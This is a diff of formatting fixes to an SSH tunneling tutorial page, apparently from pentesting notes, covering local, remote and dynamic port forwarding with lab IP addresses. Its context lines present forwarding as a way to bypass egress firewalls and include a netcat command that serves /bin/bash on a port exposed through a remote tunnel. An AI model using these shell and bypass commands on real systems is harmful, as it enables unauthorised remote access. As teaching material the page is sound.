@@ -6,8 +6,8 @@ description: Exploring SSH tunneling
 
 ## SSH: Local Port Forwarding
 
-If you are on the network that restricts you from establishing certain connections to the outside world, local port forwarding allows you to bypass this limitation.   
-  
+If you are on the network that restricts you from establishing certain connections to the outside world, local port forwarding allows you to bypass this limitation. \
+\
 For example, if you have a host that you want to access, but the egress firewall won't allow this, the below will help:
 
 ```csharp
@@ -18,7 +18,7 @@ All the traffic will flow through the SSH\_SERVER which DOES have access to the 
 
 #### On machine 10.0.0.5
 
-The below reads: bind on a local port 9999 \(on a host 10.0.0.5\). Listen for any traffic coming to that port 9999 \(i.e 127.0.0.1:9999 or 10.0.0.5:9999\) and forward it all that to the port 4444 on host 10.0.0.12:
+The below reads: bind on a local port 9999 (on a host 10.0.0.5). Listen for any traffic coming to that port 9999 (i.e 127.0.0.1:9999 or 10.0.0.5:9999) and forward it all that to the port 4444 on host 10.0.0.12:
 
 ```csharp
 ssh -L9999:10.0.0.12:4444 root@10.0.0.12 -N -f
@@ -56,7 +56,7 @@ The above suggests that any traffic sent to port 5555 on SSH\_SERVER will be for
 
 #### On machine 10.0.0.12
 
-Let's create a reverse shell listener bound to 127.0.0.1 \(not reachable to hosts from outside\) on port 4444:
+Let's create a reverse shell listener bound to 127.0.0.1 (not reachable to hosts from outside) on port 4444:
 
 ```csharp
 nc -lp 4444 -s 127.0.0.1 -e /bin/bash & ss -lt
@@ -70,7 +70,7 @@ Now, let's open a tunnel to 10.0.0.5 and create remote port forwarding by exposi
 ssh -R5555:localhost:4444 root@10.0.0.5 -fN
 ```
 
-The above says: bind a port 5555 on 10.0.0.5 and make sure that any traffic sent to port 5555 on 10.0.0.5, please send it over to port 4444 on to this box \(10.0.0.12\).
+The above says: bind a port 5555 on 10.0.0.5 and make sure that any traffic sent to port 5555 on 10.0.0.5, please send it over to port 4444 on to this box (10.0.0.12).
 
 #### On machine 10.0.0.5
 
@@ -125,6 +125,4 @@ Dynamic port forwarding plays along nicely with ProxyChains.
 ## References
 
 {% embed url="https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html" %}
-
-
 
